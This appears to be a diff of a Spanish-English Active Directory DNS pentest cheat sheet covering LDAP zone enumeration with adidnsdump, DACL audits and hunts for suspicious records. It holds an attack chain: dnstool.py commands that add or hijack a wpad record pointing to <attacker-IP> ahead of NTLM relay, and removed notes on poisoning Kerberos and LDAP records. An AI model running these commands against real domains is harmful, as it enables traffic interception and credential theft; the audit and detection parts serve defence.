@@ -20,254 +20,184 @@ linked:
 
 ***
 
-## Why DNS via LDAP
+## Por qué DNS via LDAP
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| AD-integrated zones stored in AD | Replication via AD | Architecture. |
-| LDAP path `DC=DomainDnsZones,DC=...` | Direct LDAP access | Standard. |
-| `dnsRecord` attribute | Binary blob with parsed record | Encoded. |
-| LDAP read != DNS query | Different protocols | Distinct. |
-| ANY records hidden by default DNS | LDAP shows all even hidden | Bypass. |
-| Authentication required | Domain creds typically | Limit. |
-| Default Authenticated Users read | Most zones readable | Permissive. |
-| AXFR may be disabled but LDAP open | Common gap | Vector. |
-| dnsRecord blob format | Binary needs decode | Tool needed. |
-| adidnsdump parses blobs | Python tool | Standard. |
-| RustHound / BloodHound DNS-aware | Modern collection | Adjacent. |
-| Per-record ACLs | DACL on dnsNode | Granular. |
-| Wildcard records via LDAP | Sometimes hidden in DNS but visible LDAP | Bypass. |
-| Tombstoned records still visible | Pre-purge garbage collection | Audit. |
-| Zone-level DACL audit | Privesc path discovery | ACL recon. |
-| SOA stored as dnsRecord too | Edge metadata | Detail. |
+| `ldapsearch -h <DC> -D u -w p -b "DC=DomainDnsZones,DC=corp,DC=local" "(objectClass=dnsNode)" dnsRecord` | Records via LDAP (blob binario) | AXFR cerrado pero LDAP open. |
+| `ldapsearch ... -b "DC=ForestDnsZones,DC=corp,DC=local" "(objectClass=dnsNode)"` | Forest-scope records | Forest-wide DNS visibility. |
 ^ad-adidns-why
 
-### LDAP DNS path examples
+**Por qué importa:** AXFR puede estar cerrado, pero LDAP read sobre `DomainDnsZones` está habilitado para `Authenticated Users` por default. LDAP también muestra **ANY records** que el server DNS no advertise (creados por usuarios via LDAP write).
 
+**DNs típicos:**
 ```
-# Domain DNS partition
-DC=DomainDnsZones,DC=dom,DC=local
-  └── DC=dom.local
-        ├── DC=dc01            (A record)
-        ├── DC=dc02            (A record)
-        ├── DC=@               (zone apex)
-        └── DC=_msdcs.dom.local (subdomain)
+DC=DomainDnsZones,DC=corp,DC=local
+  └── DC=corp.local                      (zone object)
+        ├── DC=@                         (zone apex / SOA)
+        ├── DC=dc01                      (A record)
+        ├── DC=webserver                 (A record)
+        └── DC=_msdcs.corp.local         (subdomain)
 
-# Forest DNS partition
-DC=ForestDnsZones,DC=forest,DC=local
-  └── DC=_msdcs.forest.local
-
-# Legacy
-CN=MicrosoftDNS,CN=System,DC=dom,DC=local
+DC=ForestDnsZones,DC=corp,DC=local
+  └── DC=_msdcs.corp.local
 ```
 
 ___
 
-## adidnsdump Tool
+## adidnsdump
 
-| **Comando** | **Output** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `adidnsdump -u 'dom\user' -p pass DC` | Zone list | Discovery. |
-| `adidnsdump -u 'dom\user' -p pass DC --print-zones` | Print zones to stdout | Quick view. |
-| `adidnsdump -u 'dom\user' -p pass DC -r` | Resolve via DNS for verification | Validates. |
-| `adidnsdump -u 'dom\user' -p pass DC -z dom.local` | Specific zone | Targeted. |
-| `adidnsdump -u 'dom\user' -p pass DC --print-zones --verbose` | Verbose | Debug. |
-| `adidnsdump -u 'dom\user' -p pass DC --include-hidden` | Show "hidden" records | Default lists ANY records. |
-| Output file `records.csv` | CSV format | Default. |
-| Auth via TGT/Kerberos | `-k` Kerberos auth | Modern. |
-| LDAPS support | Auto-detect | Encrypted. |
-| Cert auth (PFX) | Modern auth | Edge. |
-| Anonymous attempt | Some zones allow | Edge. |
-| Forest zones via `-z` | Forest scope | Adjacent. |
-| Decoded blob → record fields | Type, value, timestamp | Standard. |
-| Generates LDIF too | Restoration format | Edge. |
-| Compatible with bloodyAD | Same auth model | Adjacent. |
-| Python install | `pip install adidnsdump` | Standard. |
+| `adidnsdump -u 'corp\u' -p pass <DC> --print-zones` | Lista zones | Discovery. |
+| `adidnsdump -u 'corp\u' -p pass <DC>` | Dump default zone | Records visibles. |
+| `adidnsdump -u 'corp\u' -p pass <DC> -r` | Resolve via DNS para verificar | Validar contra DNS. |
+| `adidnsdump -u 'corp\u' -p pass <DC> --include-tombstoned` | Records tombstoned | Forensics / persistence hunt. |
+| `adidnsdump -u 'corp\u' -p pass <DC> -k` | Kerberos auth (con TGT vía `kinit`) | OPSEC sin password en línea. |
+| `adidnsdump -u 'corp\u' -p pass <DC> --ssl` | LDAPS | Encrypted. |
 ^ad-adidns-tool
-
-### Standard usage
 
 ```bash
 # Install
 pip install git+https://github.com/dirkjanm/adidnsdump
 
-# Basic enumeration (all zones)
-adidnsdump -u 'dom\user' --password 'pass' DC
+# Pipeline típico
+adidnsdump -u 'corp\auditor' -p pass <DC> --print-zones
+adidnsdump -u 'corp\auditor' -p pass <DC> -r > records.csv
 
-# Specific zone with DNS resolution
-adidnsdump -u 'dom\user' --password 'pass' DC -r --zone dom.local
-
-# Output: records.csv
-# Format: name,type,address
-# Example:
-#   @,SOA,...
-#   dc01,A,10.0.0.10
-#   webserver,A,10.0.0.50
-#   wpad,A,10.0.0.100
-#   *,A,10.0.0.200
+# Output records.csv:
+# name,type,address
+# dc01,A,10.0.0.10
+# webserver,A,10.0.0.50
+# wpad,A,10.0.0.100   ← red flag
+# *,A,10.0.0.200      ← wildcard catch-all
 ```
 
 ___
 
 ## ANY Records / Default Visibility
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Por qué importa** |
 |:---:|:---:|:---:|
-| ANY records | Default DACL | All Authenticated Users can create. |
-| Default Permission: Create child | Authenticated Users can add records | Risk. |
-| `Resolve-DnsName ANY` | Get all records of a name | Native. |
-| ANY hidden by default DNS query | Server doesn't return | Hidden visibility. |
-| LDAP query reveals ANY | Direct LDAP shows hidden | Bypass. |
-| DNS spoofing prerequisite | ANY record write capability | Common attack base. |
-| WPAD attack base | Create wpad A record | Combo. |
-| LLMNR fallback when WPAD missing | If WPAD spoof + name not in DNS | Combo. |
-| Created by atacante via LDAP | LDAP write permission needed | Direct. |
-| DDNS update vs LDAP write | Different paths same outcome | Adjacent. |
-| Pre-existing record blocks creation | Conflicts | Edge. |
-| Wildcard `*` record | Catch-all | Critical for spoofing. |
-| `wpad`, `isatap` blocked in some Win versions | Modern protection | Defense. |
-| Audit Authenticated Users CreateChild | Default behavior | Permission audit. |
-| Restrict creation to specific groups | Hardening | Defense. |
-| Modern Microsoft DNS (Server 2016+) | Restricted creation | Better default. |
+| `adidnsdump -u u -p pass <DC>` | LDAP records (incluye ANY que DNS oculta) | LDAP > DNS visibility. |
+| `dig +short ANY <name>.<dom> @<DC>` | DNS responde solo si record advertised | Comparar contra LDAP. |
+| `(Get-Acl "AD:DC=<dom>,DC=DomainDnsZones,...").Access \| ? IdentityReference -match "Authenticated Users"` | DACL `CreateChild` para Auth Users | Detectar permission default. |
 ^ad-adidns-any
 
-### ANY record discovery + creation
+**Default DACL:** `Authenticated Users` tiene `CreateChild` sobre la zone — significa **cualquier user del domain puede crear A records**. Base para WPAD attacks, KDC poisoning, fake auth servers.
 
 ```bash
-# List all records visible via LDAP (incl. ANY)
-adidnsdump -u 'dom\user' --password 'pass' DC --include-hidden -z dom.local
+# Comparar LDAP vs DNS — detectar ANY records ocultos
+adidnsdump -u 'corp\u' -p pass <DC> > all_ldap.csv
 
-# Compare with DNS:
-# Records in LDAP but NOT in DNS = ANY records (server doesn't advertise)
-
-# Create ANY record (krbrelayx dnstool combined)
-git clone https://github.com/dirkjanm/krbrelayx
-python3 dnstool.py -u 'dom\user' -p pass -a add -r evil -d 1.2.3.4 DC
+# Records en LDAP pero no resolviendo en DNS = ANY records
+while IFS=',' read name type addr; do
+  R=$(dig +short "$type" "$name.corp.local" @<DC>)
+  [ -z "$R" ] && echo "[ANY] $name $type $addr"
+done < all_ldap.csv
 ```
 
 ___
 
 ## DNS Permissions Audit
 
-| **Comando** | **Output** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `Get-Acl "AD:DC=DomainDnsZones,DC=dom,DC=local"` | Partition DACL | RSAT. |
-| `Get-Acl "AD:DC=dom.local,DC=DomainDnsZones,..."` | Zone DACL | Per-zone. |
-| `Get-Acl "AD:DC=hostname,DC=dom.local,..."` | Per-record DACL | Per-record. |
-| `dsacls "DC=DomainDnsZones,DC=dom,DC=local"` | Native | Adjacent. |
-| `bloodyAD --host DC -d dom -u u -p p get object DC=dom.local,DC=DomainDnsZones,DC=dom,DC=local --resolve-sd` | Detailed DACL | Linux. |
-| GenericAll on dnsZone | Modify all records | Critical. |
-| GenericWrite on dnsZone | Modify records | Common abuse. |
-| WriteDACL on dnsZone | Escalate to Generic All | 2-step. |
-| Create child on dnsZone | Add records (default Auth Users) | Spoof base. |
-| WriteProperty on dnsRecord | Edit specific record | Granular. |
-| Per-record DACL inheritance | Children inherit | Standard. |
-| DNS Admins recursive perms | Propagated to all records | Standard. |
-| Default for Authenticated Users | CreateChild on zone | Permissive. |
-| Hardening: deny CreateChild | Modern best practice | Defense. |
-| BloodHound DNS edge | `WriteDnsRecord` (custom edge) | Custom analytics. |
-| Detection: SACL audit DNS partition | Defender alert | Adjacent. |
+| `Get-Acl "AD:DC=corp.local,DC=DomainDnsZones,DC=corp,DC=local"` | DACL de la zone | Privesc audit. |
+| `Get-Acl "AD:DC=<host>,DC=corp.local,DC=DomainDnsZones,..."` | DACL per-record | Granular audit. |
+| `dsacls "DC=DomainDnsZones,DC=corp,DC=local"` | DACL via dsacls native | Sin RSAT. |
+| `bloodyAD --host <DC> -d corp -u u -p pass get object "DC=corp.local,DC=DomainDnsZones,DC=corp,DC=local" --resolve-sd` | DACL desde Linux | OPSEC Linux. |
 ^ad-adidns-acl
 
-### DNS DACL audit
+**ACEs peligrosos en zone:** `GenericAll`, `GenericWrite`, `WriteDACL`, `CreateChild`. Default = `Authenticated Users` con `CreateChild` (suficiente para spoofing).
 
 ```powershell
-# Per-zone DACL
-Get-Acl "AD:DC=dom.local,DC=DomainDnsZones,DC=dom,DC=local" |
+# Audit DACL — non-default principals con write
+Get-Acl "AD:DC=corp.local,DC=DomainDnsZones,DC=corp,DC=local" |
   Select -ExpandProperty Access |
-  Where {$_.AccessControlType -eq "Allow"} |
-  Where {$_.IdentityReference -notmatch "BUILTIN|NT AUTHORITY|Domain Admins"} |
+  Where {
+    $_.AccessControlType -eq "Allow" -and
+    $_.IdentityReference -notmatch "BUILTIN|NT AUTHORITY|Domain Admins|Enterprise Admins|SYSTEM" -and
+    $_.ActiveDirectoryRights -match "Write|Create|GenericAll"
+  } |
   Select IdentityReference,ActiveDirectoryRights
 
-# All zones with non-default permissions
-Get-ChildItem "AD:DC=DomainDnsZones,DC=dom,DC=local" |
-  ForEach-Object {
-    $dn = $_.DistinguishedName
-    Get-Acl "AD:$dn" |
-      Select -ExpandProperty Access |
-      Where {$_.AccessControlType -eq "Allow" -and $_.IdentityReference -notmatch "BUILTIN|Domain Admins|Enterprise Admins|SYSTEM"} |
-      Select @{n='Zone';e={$dn}},IdentityReference,ActiveDirectoryRights
-  }
+# All zones con permisos non-default
+Get-ChildItem "AD:DC=DomainDnsZones,DC=corp,DC=local" | % {
+  $dn = $_.DistinguishedName
+  Get-Acl "AD:$dn" | Select -ExpandProperty Access |
+    Where { $_.IdentityReference -match "Authenticated Users|Domain Users" -and $_.ActiveDirectoryRights -match "Write|Create" } |
+    Select @{n='Zone';e={$dn}},IdentityReference,ActiveDirectoryRights
+}
 ```
 
 ___
 
-## Records Manipulation Tools
+## Records Manipulation
 
-| **Tool** | **Comando** | **Notas** |
+| **Comando** | **Acción** | **Cuándo** |
 |:---:|:---:|:---:|
-| `dnstool.py` (krbrelayx) | `dnstool.py -u u -p p -a add -r host -d ip DC` | Add via LDAP. |
-| `dnstool.py` query | `dnstool.py -u u -p p -a query -r host DC` | Query specific. |
-| `dnstool.py` modify | `dnstool.py -u u -p p -a modify ...` | Modify. |
-| `dnstool.py` remove | `dnstool.py -u u -p p -a remove ...` | Remove. |
-| `dnstool.py` ldapdelete | `--remove-tombstone` purge | Edge. |
-| `Set-DnsServerResourceRecord` | RSAT modify | Native. |
-| `Add-DnsServerResourceRecord` | RSAT add | Native. |
-| `Remove-DnsServerResourceRecord` | RSAT remove | Native. |
-| `dnscmd /recordadd` | Native CLI | Adjacent. |
-| `bloodyAD` LDAP modifier | Generic LDAP | Linux. |
-| Direct LDAP modify | Custom scripts | DIY. |
-| krbrelayx auto-add WPAD | Combo with relay | Attack chain. |
-| mitm6 + dnstool | IPv6 takeover | Combo (ver hub mitm6). |
-| `Set-DnsServerForwarder` | Forwarder manipulation | Edge. |
-| Conditional forwarders | Cross-zone control | Edge. |
-| `Restore-DnsServerSecondaryZone` | Edge | Adjacent. |
+| `dnstool.py -u 'corp\u' -p pass -a add -r wpad -d <attacker-IP> <DC>` | Add A record (LDAP write) | WPAD spoof. |
+| `dnstool.py -u 'corp\u' -p pass -a query -r <name> <DC>` | Query record | Pre-modify check. |
+| `dnstool.py -u 'corp\u' -p pass -a modify -r <name> -d <new-IP> <DC>` | Modify existing A | Hijack. |
+| `dnstool.py -u 'corp\u' -p pass -a remove -r <name> <DC>` | Remove (tombstone) | Cleanup. |
+| `dnstool.py -u 'corp\u' -p pass -a remove -r <name> --remove-tombstone <DC>` | Purge tombstone | Persistence cleanup. |
+| `Add-DnsServerResourceRecord -ZoneName <zone> -A -Name <n> -IPv4Address <ip> -ComputerName <DC>` | Add via RSAT | Native authenticated. |
+| `Set-DnsServerResourceRecord` | Modify via RSAT | Native. |
+| `Remove-DnsServerResourceRecord -ZoneName <zone> -RRType A -Name <n>` | Remove via RSAT | Native. |
+| `bloodyAD --host <DC> -d corp -u u -p pass add dnsRecord <zone> <name> <ip>` | Add via bloodyAD | Linux. |
 ^ad-adidns-tools
 
-### Add WPAD record (DNS spoof)
-
 ```bash
-# Create wpad record pointing to attacker
-python3 dnstool.py -u 'dom\user' -p pass -a add -r wpad -d ATTACKER_IP DC
+# WPAD spoof completo
+git clone https://github.com/dirkjanm/krbrelayx
+cd krbrelayx
 
-# Verify creation
-dig +short A wpad.dom.local @DC
+# 1. Add WPAD record
+python3 dnstool.py -u 'corp\u' -p pass -a add -r wpad -d <attacker-IP> <DC>
 
-# Cleanup after attack
-python3 dnstool.py -u 'dom\user' -p pass -a remove -r wpad DC
+# 2. Verify
+dig +short A wpad.corp.local @<DC>
+
+# 3. Coercion + relay listener (en otra terminal)
+# ntlmrelayx.py + responder
+
+# 4. Cleanup post-engagement
+python3 dnstool.py -u 'corp\u' -p pass -a remove -r wpad <DC>
 ```
 
 ___
 
 ## DNS-Based Persistence
 
-| **Vector** | **Cómo** | **Notas** |
+| **Comando defensor** | **Qué detecta** | **Acción** |
 |:---:|:---:|:---:|
-| Persistent A record to attacker | Create record, schedule purges | Standard persistence. |
-| Wildcard record `*` | Catch-all for non-existent names | Critical. |
-| WPAD record → attacker proxy | Browser auto-config redirected | Combo. |
-| ISATAP record → IPv6 tunnel | Edge IPv6 routing | Edge. |
-| `_kerberos._tcp` poison → fake KDC | Auth interception | Critical. |
-| `_ldap._tcp` poison → fake LDAP | Auth interception | Critical. |
-| Internal CDN → backdoored | Modify A record for app | Persistent. |
-| Conditional forwarder → atacante DNS | Forward queries to attacker | Persistent. |
-| Static record (no scavenge) | Won't auto-purge | Resilient. |
-| TimeStamp 0 = static | LDAP attribute | Direct. |
-| Hidden ANY record | Doesn't show in default DNS | Stealth. |
-| Sub-zone delegation to atacante | Add NS record | Edge. |
-| Hosts file backup | Local file as backup | Combo. |
-| DDNS auto-recreate after purge | If insecure DDNS | Auto-restore. |
-| GPO + DNS suffix | Add attacker domain to suffix list | Edge. |
-| Defender: scavenge stale + audit additions | Standard hygiene | Defense. |
+| `Get-DnsServerResourceRecord -ZoneName <zone> \| ? Timestamp -eq 0` | Static records (no scavenging) | Audit — static = atacante candidato. |
+| `Get-DnsServerResourceRecord -ZoneName <zone> \| ? Timestamp -gt (Get-Date).AddDays(-7)` | Records añadidos última semana | Detect new persistence. |
+| `Get-DnsServerResourceRecord -ZoneName <zone> \| ? HostName -in '*','wpad','isatap','_kerberos','_ldap'` | Records peligrosos | Critical hunt. |
+| `Get-DnsServerResourceRecord -ZoneName <zone> -RRType SRV \| ? RecordData -notmatch <legit-DC>` | SRV apuntando a non-DC | KDC/LDAP poisoning. |
+| Audit Subcategory `Directory Service Changes` | Logs de modificación LDAP a `dnsNode` | Defender alerting. |
 ^ad-adidns-persistence
 
-### Persistent record audit
-
 ```powershell
-# Static records (TimeStamp = 0)
-Get-DnsServerResourceRecord -ZoneName "dom.local" -ComputerName DC |
-  Where {$_.Timestamp -eq 0} |
+# Hunt persistence DNS comprehensive
+$Zone = "corp.local"
+$DC = "dc01"
+
+# Static records (no expiran via scavenging)
+Get-DnsServerResourceRecord -ZoneName $Zone -ComputerName $DC |
+  Where Timestamp -eq 0 |
   Select RecordType,HostName,RecordData
 
-# Recently added records (last 7 days)
-Get-DnsServerResourceRecord -ZoneName "dom.local" -ComputerName DC |
-  Where {$_.Timestamp -gt (Get-Date).AddDays(-7)} |
+# Records sospechosos por nombre
+Get-DnsServerResourceRecord -ZoneName $Zone -ComputerName $DC |
+  Where { $_.HostName -in '*','wpad','isatap' -or $_.HostName -match '^_(kerberos|ldap|kpasswd)' } |
   Select RecordType,HostName,RecordData,Timestamp
 
-# Wildcard or suspicious records
-Get-DnsServerResourceRecord -ZoneName "dom.local" -ComputerName DC |
-  Where {$_.HostName -in '*','wpad','isatap'} |
-  Select RecordType,HostName,RecordData
+# Records nuevos (<7d)
+Get-DnsServerResourceRecord -ZoneName $Zone -ComputerName $DC |
+  Where Timestamp -gt (Get-Date).AddDays(-7) |
+  Select RecordType,HostName,RecordData,Timestamp
 ```
 
 ***
